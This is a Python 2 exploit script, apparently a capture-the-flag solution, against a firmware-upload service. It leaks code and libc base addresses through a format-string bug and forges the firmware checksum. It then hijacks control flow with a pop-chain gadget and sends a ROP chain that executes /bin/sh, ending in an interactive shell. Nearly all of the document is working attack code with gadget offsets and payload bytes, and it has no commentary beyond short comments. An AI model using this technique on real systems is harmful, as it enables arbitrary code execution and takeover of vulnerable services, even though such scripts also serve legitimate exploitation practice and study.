import time
import struct
import interact

# config
popchain_offset = 0x000000000013cc0f# : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
prdi_offset = 0x0000000000021102# : pop rdi ; ret
prdx_offset = 0x0000000000001b92# : pop rdx ; ret
prax_offset = 0x0000000000033544
syscall_offset = 0x00000000000bc375# : syscall ; ret
sh_offset = 0x18cd57#/bin/sh\x00

def upload(code):
    p.sendline('U')
    p.sendline(code)

def overwrite(addr1, addr2):
    code1 = struct.pack('Q', addr1)
    code2 = struct.pack('Q', addr2)
    code1 = ''.join([ '2'+x for x in list(code1)])
    code2 = ''.join([ '2'+x for x in list(code2)])
    upload('2A'*(0x40+4)+code1+code2+'7'*69+'9')
    p.sendline('E')
    
def a2c(addr):
    code = struct.pack('Q', addr)
    code = ''.join([ '2'+x for x in list(code)])
    return code

def p64(x):
    return struct.pack('Q', x)
    
p = interact.Process()
time.sleep(1)

# enable debug and override
p.sendline('U')
code = 'FW\x12\x11008\x313\x31'+'9'
p.sendline(code.ljust(0x400, '\x00'))
p.sendline('E')

# disable debug so that prdi will be passed to an arbitrary function
code = 'FW\xa2\xe700809'.ljust(0x400, '\x00')
upload(code)
p.sendline('E')

# leak code_base and libc_base by printf(fmt)
code = 'FW\x7a\x9a00'+'2%222$2p'+'2%23232$2p'+'2A'*(0x3c-9)+a2c(0x4141414141414142)+'2\x00'+'2\x49'+'7'*69+'9'
upload(code.ljust(0x400, '\x00'))
p.sendline('E')
p.readuntil('SUCCESSFUL!\n')
p.readuntil('SUCCESSFUL!\n')
print p.readuntil('SUCCESSFUL!\n')# used to tell whether the program crashes or platform sucks
code_base = int(p.recv(14), 16) - 0x900
libc_base = int(p.recv(14), 16) - 0x7f0000248830 + 0x7f0000228000

# config
print 'code_base: %#x' % code_base
print 'libc_base: %#x' % libc_base
prdi = libc_base + prdi_offset
prdx = libc_base + prdx_offset
prax = libc_base + prax_offset
sh = libc_base + sh_offset
syscall = libc_base + syscall_offset

# reset environment and do it again
p.sendline('R')

# enable debug mode to get the correct checksum
p.sendline('U')
code = 'FW\x12\x11008\x313\x31'+'9'
p.sendline(code.ljust(0x400, '\x00'))
p.sendline('E')

# get the the correct checksum
code = 'FW\x51\xf100'+'2/2b2i2n'+'2/2s2h2\x002\x003\x31'+'2A'*(0x3c-1)+a2c(libc_base+popchain_offset)+'2\x00'+'2\x49'+'7'*69+'9'
upload(code.ljust(0x400, 'B'))
p.readuntil('ACTUAL FW CHECKSUM: ')
c = p.recv(4).decode('hex')

# disable debug mode so that rsi will be set 0//not important, we can set it in rop chain, but at least we can save 0x10 bytes in rop chain. XD
code = 'FW\xa2\xe700809'.ljust(0x400, '\x00')
upload(code)
p.sendline('E')

# call popchain and return to rop chain
code = 'FW'+c[1]+c[0]+'00'+'2/2b2i2n'+'2/2s2h2\x002\x003\x31'+'2A'*(0x3c-1)+a2c(libc_base+popchain_offset)+'2\x00'+'2\x49'+'7'*69+'9'
upload(code.ljust(0x400, 'B'))

# prepare rop chain
payload = 'EAAAAAAA'+p64(prdi)+p64(sh)+p64(prdx)+p64(0)+p64(prax)+p64(59)+p64(syscall)
assert len(payload) <= 128
p.sendline(payload)

p.interactive()
